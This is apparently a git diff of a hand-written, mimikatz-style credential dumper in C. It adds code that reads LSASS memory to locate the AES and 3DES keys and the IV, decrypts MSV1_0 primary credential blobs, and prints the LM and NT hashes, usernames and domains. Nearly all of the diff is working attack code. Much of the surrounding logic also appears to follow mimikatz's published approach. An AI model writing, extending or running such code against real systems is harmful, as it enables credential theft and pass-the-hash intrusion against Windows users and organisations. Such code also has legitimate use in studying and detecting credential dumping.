@@ -313,16 +313,273 @@ typedef struct _LSA_LOGON_SESSION {
 } LSA_LOGON_SESSION;
 
 
+#define IVOffset 67 //67
+#define AESKeyOffset 16//+16
+#define DESKeyOffset 89 //-89
 
 
-void decryptBlob(HANDLE hTarget) {
+#define DESKeySize 0x18
+#define AESKeySize 0x10
+
+
+void printKeyBytes(const BYTE* key, size_t len, const char* name) {
+	printf("%s: ", name);
+	for (size_t i = 0; i < len; i++) {
+		printf("%02X ", key[i]);
+	}
+	printf("\n");
+}
+
+
+typedef struct _ENC_KEYS {
+	BYTE AESKey[16];    // AES key size
+	size_t AESKeyLen;   // actual key length (cbSecret)
+
+	BYTE DESKey[24];    // DES key size
+	size_t DESKeyLen;   // actual key length (cbSecret)
+	
+	BYTE IVKey[16];    // AES key size
+	size_t IVKeyLen;   // actual key length (cbSecret)
+
+
+} ENC_KEYS, * PENC_KEYS;
+
+
+void findKeys(HANDLE hTarget, PVOID pKeyBase, OUT PENC_KEYS keysOut) {
+
+
+	unsigned char IV[16];
+	unsigned char AES[16];
+	unsigned char DES[24];
+
+	
+
+	
+	 //pKeyBase takes you to the base of a BCRYPTE_KEY_HANDLE
+
+
+	int32_t hAesKeyOffset = 0; //what took me forever to realize is that this offset in mimikatz is not hte KEY, its a relative offset to the KEY.
+	int32_t hDesKeyOffset = 0;
+	int32_t IVRelativeOffset = 0;
+
+	size_t written = 0;
+	//retr offset from pattern to pointer to key handle
+	if(!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + AESKeyOffset), &hAesKeyOffset, sizeof(int32_t), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase - DESKeyOffset), &hDesKeyOffset, sizeof(int32_t), &written)) {
+		printf("Could not retr DES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + IVOffset), &IVRelativeOffset, sizeof(int32_t), &written)) {
+		printf("Could not retr DES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+
+	//using offset, retrieve pointer to key handle.
+
+	PKIWI_BCRYPT_HANDLE_KEY hAesKeyRemote = NULL;
+	PKIWI_BCRYPT_HANDLE_KEY hDesKeyRemote = NULL; // remote address of struct
+
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + AESKeyOffset + 4 + hAesKeyOffset), &hAesKeyRemote, sizeof(hAesKeyRemote), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase - DESKeyOffset + 4 + hDesKeyOffset), &hDesKeyRemote, sizeof(hDesKeyRemote), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + IVOffset + 4 + IVRelativeOffset), &IV, sizeof(IV), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	printf("AES Key Retr in LSASS @ 0x%p\n", hAesKeyRemote);
+	printf("DES Key Retr in LSASS @ 0x%p\n", hDesKeyRemote);
+
+
+	//read pointer to remote key handle -> local memory
+	KIWI_BCRYPT_HANDLE_KEY hAesKeyHandlLocal;
+	KIWI_BCRYPT_HANDLE_KEY hDesKeyHandleLocal;
+	if (!ReadProcessMemory(hTarget, hAesKeyRemote, &hAesKeyHandlLocal, sizeof(hAesKeyHandlLocal), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, hDesKeyRemote, &hDesKeyHandleLocal, sizeof(hDesKeyHandleLocal), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	KIWI_BCRYPT_KEY81 aes81Key;
+	KIWI_BCRYPT_KEY81 des81Key;
+	
+
+	if (!ReadProcessMemory(hTarget, hAesKeyHandlLocal.key, &aes81Key, sizeof(KIWI_BCRYPT_KEY81), &written)) {
+		printf("Could not retr AES81 Key");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, hDesKeyHandleLocal.key, &des81Key, sizeof(KIWI_BCRYPT_KEY81), &written)) {
+		printf("Could not retr AES81 Key");
+		return;
+	}
+	BYTE AESKeyBytes[AESKeySize]; // should this be sized to cbSecret?
+	BYTE DESKeyBytes[DESKeySize];
+
+    memcpy(AESKeyBytes, aes81Key.hardkey.data,aes81Key.hardkey.cbSecret);
+	memcpy(DESKeyBytes, des81Key.hardkey.data, des81Key.hardkey.cbSecret);
+
+	//memcpy(DESKeyBytes, des81Key.hardkey.data, des81Key.hardkey.cbSecret);
+
+	//now we should have the AES & DES Keys
+
+	printKeyBytes(AESKeyBytes, aes81Key.hardkey.cbSecret, "AES KEY");
+	printKeyBytes(DESKeyBytes, des81Key.hardkey.cbSecret, "DES KEY");
+	printKeyBytes(IV, sizeof(IV), "Initialization Vector");
+
+	//printKeyBytes(DESKeyBytes, des81Key.hardkey.cbSecret, "DES KEY");
+
+	memcpy(keysOut->AESKey, AESKeyBytes, aes81Key.hardkey.cbSecret);
+	memcpy(keysOut->DESKey, DESKeyBytes, des81Key.hardkey.cbSecret);
+	memcpy(keysOut->IVKey, IV, sizeof(IV));
+
+	keysOut->AESKeyLen = AESKeySize;
+	keysOut->DESKeyLen = DESKeySize;
+	keysOut->IVKeyLen = sizeof(IV);
+
+
+	//then our key should be in aesHardKey.data..
+	
+
+}
+
+void decryptBlob(const BYTE* blob, SIZE_T blobLen, ENC_KEYS keys) {
+
+	SECURITY_BLOB secBlob = { 0 };
+
+
+	printKeyBytes(blob, (SIZE_T)blobLen, "BLOB\n");
+	
+	
+	///////
+
+	BCRYPT_ALG_HANDLE algAESHandle = 0;
+	BCRYPT_ALG_HANDLE algDESHandle = 0;
+
+	BCRYPT_KEY_HANDLE hAESKey;
+	BCRYPT_KEY_HANDLE hDESKey;
+
+	ULONG resultLen = 0;
+
+	BYTE ivCopyAES[16];
+	memcpy(ivCopyAES, keys.IVKey, 16);
+
+	BYTE ivCopyDES[8];
+	memcpy(ivCopyDES, keys.IVKey, 8);
+
+	unsigned char HASH[1024];
+	ULONG LenHASH = sizeof(HASH);
+	char buf[1024];
+
+	NTSTATUS bcryptResult;
+
+	printf("Checking if AES or DES..\n");
+	if (blobLen  % 8 != 0) {
+		printf("AES Selected.\n");
+
+		bcryptResult = BCryptOpenAlgorithmProvider(&algAESHandle, BCRYPT_AES_ALGORITHM, 0, 0);
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot open alg provider\n");
+		}
+		printf("Alg handle made.\n");
+
+		bcryptResult = BCryptSetProperty(algAESHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot set cahining mode CFB\n");
+		}
+		printf("Set properties\n");
+
+		bcryptResult = BCryptGenerateSymmetricKey(algAESHandle, &hAESKey, NULL, 0, keys.AESKey, keys.AESKeyLen, 0);
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot create symmetric key based on found key\n");
+		}
+		printf("Symmetric Key generated\n");
+
+		bcryptResult = BCryptDecrypt(hAESKey, (PUCHAR)blob, blobLen, NULL, ivCopyAES, sizeof(ivCopyAES), HASH, LenHASH, &resultLen, 0);
+		printf("Decrypted Lsaunicode string buffer\n");
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot open decrypt hash\n");
+		}
+		if (hAESKey) BCryptDestroyKey(hAESKey);
+		if (algAESHandle) BCryptCloseAlgorithmProvider(algAESHandle, 0);
+	} else {
+		printf("DES Selected.\n");
+
+		bcryptResult = BCryptOpenAlgorithmProvider(&algDESHandle, BCRYPT_3DES_ALGORITHM, 0, 0);
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot open alg provider\n");
+		}
+		printf("Alg handle made.\n");
+
+		bcryptResult = BCryptSetProperty(algDESHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot set cahining mode CBC\n");
+		}
+		printf("Set property .\n");
+
+		bcryptResult = BCryptGenerateSymmetricKey(algDESHandle, &hDESKey, NULL, 0, keys.DESKey, keys.DESKeyLen, 0);
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot create symmetric key based on found key\n");
+		}
+		printf("Genned sym key .\n");
+		printf("Trying to decrypt... please../..\n");
+
+		bcryptResult = BCryptDecrypt(hDESKey, (PUCHAR)blob, blobLen, 0, ivCopyDES, sizeof(ivCopyDES), HASH, LenHASH, &resultLen, 0);
+		//		bcryptResult = BCryptDecrypt(hDESKey, (PUCHAR)LsaUnicodeString.Buffer, LsaUnicodeString.Length, 0, keys.IVKey, 8, HASH, LenHASH, &LenHASH, 0);
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot open decrypt hash\n");
+		}
+		printf("Decryoted hash...\n");
+
+	}
+
+	if (!NT_SUCCESS(bcryptResult)) {
+		printf("Decrypt failed: 0x%x\n", bcryptResult);
+	}
+	else {
+		printf("Decrypted %lu bytes.\n", resultLen);
+		wprintf(L"Decrypted (as string): %.*ls\n", resultLen / 2, (wchar_t*)HASH);
+		printKeyBytes(HASH, resultLen, "Decrypted blob (hex):");
+
+		memcpy(&secBlob, HASH, sizeof(HASH));
+		// Access the hashes
+		printf("LM Hash: ");
+		for (int i = 0; i < 16; i++) printf("%02X", secBlob.LMHash[i]);
+		printf("\n");
+
+		printf("NT Hash: ");
+		for (int i = 0; i < 16; i++) printf("%02X", secBlob.NTHash[i]);
+		printf("\n");
+
+		// Access the username and domain (UTF-16)
+		wprintf(L"Username: %ls\n", secBlob.Username);
+		wprintf(L"Domain: %ls\n", secBlob.Domain);
+
+	}
 
 }
 
 
 
+void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList, PVOID pKeysBase) {
 
-void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {
+
+	ENC_KEYS keys = { 0 };
+	findKeys(hTarget, pKeysBase, &keys);
+
 
 	// Step 1: read the head pointer (points into LSASS memory)
 	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
@@ -361,14 +618,24 @@ void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {
 				getchar();
 				if (ReadProcessMemory(hTarget, pPrimaryCredentials, &PrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL)) {
 					LSA_UNICODE_STRING LsaUnicodeString = PrimaryCredentials.Credentials;
-					wchar_t blob[0x1B0] = { 0 }; //size of blob = 0x1B0
-					SIZE_T bytesToRead = min(LsaUnicodeString.Length, sizeof(blob) - sizeof(wchar_t));
-					if (ReadProcessMemory(hTarget, LsaUnicodeString.Buffer, blob, bytesToRead, NULL)) {
-						// Length is in bytes, so divide by sizeof(WCHAR)
-						wprintf(L"[+] Security Blob: %.*s\n", LsaUnicodeString.Length / sizeof(WCHAR), blob);
-						//decryptBlob(blob);
-					}
-					else {
+					
+					if (LsaUnicodeString.Length > 0 && LsaUnicodeString.Buffer) {
+						SIZE_T blobSize = LsaUnicodeString.Length; // already in bytes
+						BYTE* blob = (BYTE*)malloc(blobSize);
+						if (blob) {
+							if (ReadProcessMemory(hTarget, LsaUnicodeString.Buffer, blob, blobSize, NULL)) {
+								printf("[+] Security Blob (%llu bytes)\n", (unsigned long long)blobSize);
+
+								// Optionally print as hex
+								for (SIZE_T i = 0; i < blobSize; i++)
+									printf("%02X ", blob[i]);
+								printf("\n");
+
+								printf("Entering Decrypt routine...\n");
+								decryptBlob(blob, blobSize, keys);
+							}
+						}
+					}else {
 						printf("[-] Failed to read Lsa Unicode String buffer @ %p\n",LsaUnicodeString.Buffer);
 					}
 				}
@@ -557,17 +824,24 @@ int main(int argc, wchar_t* argv[]) {
 	printf("Offset of Credentials = 0x%zx\n",offsetof(KIWI_MSV1_0_LIST_63, Credentials)); //offset A0?
 	PVOID pLogonSessionList = (PVOID)(uintptr_t)target;
 
+
+
 	userlandExtraction(hTarget, (PVOID)pLogonSessionList);
 
 	wchar_t blob[0x1B0] = { 0 };
-	getSecurityBlob(hTarget, (PVOID)pLogonSessionList);
+	getSecurityBlob(hTarget, (PVOID)pLogonSessionList,pKeysBase);
 
 	getchar();
 
 	printf("\nKeys Base: 0x%p\n", pKeysBase);
 	//now that we have keys base, extract Keys
 
+
+
+
 	getchar();
+
+
 
 
 	std::cout << "Hello world\n";
